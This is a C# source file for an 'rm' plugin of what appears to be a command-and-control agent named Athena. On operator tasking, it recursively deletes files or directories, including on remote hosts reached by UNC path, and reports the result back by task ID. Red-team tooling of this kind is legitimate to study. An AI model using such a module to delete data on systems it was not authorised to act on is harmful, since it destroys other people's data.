using Athena.Models;
using Athena.Commands.Models;
using System;
using System.Collections.Generic;
using System.IO;
using Athena.Commands;
using Athena.Models.Responses;
using Athena.Models.Comms.Tasks;

namespace Plugins
{
    public class Rm : IPlugin
    {
        public string Name => "rm";

        public bool Interactive => false;

        public void Interact(InteractiveMessage message)
        {
            throw new NotImplementedException();
        }

        public bool IsRunning()
        {
            throw new NotImplementedException();
        }

        public void Start(Dictionary<string, string> args)
        {
            string file = args.ContainsKey("file") ? args["file"] : string.Empty;
            string path = args.ContainsKey("path") ? args["path"] : string.Empty;
            string host = args.ContainsKey("host") ? args["host"] : string.Empty;

            if (!String.IsNullOrEmpty(host) &! host.StartsWith("\\\\"))
            {
                host = "\\\\" + host;
            }

            string fullPath = Path.Combine(host, path, file);
            try
            {
                FileAttributes attr = File.GetAttributes(fullPath);
                if (attr.HasFlag(FileAttributes.Directory))
                {
                    Directory.Delete(fullPath.Replace("\"", ""), true);
                }
                else
                {
                    File.Delete(fullPath.Replace("\"",""));
                }
                TaskResponseHandler.Write($"{fullPath} removed.", args["task-id"], false);

            }
            catch (Exception e)
            {

                TaskResponseHandler.Write(e.ToString(), args["task-id"], true, "error");
                return;
            }
        }

        public void Stop(string task_id)
        {
            throw new NotImplementedException();
        }
    }
}
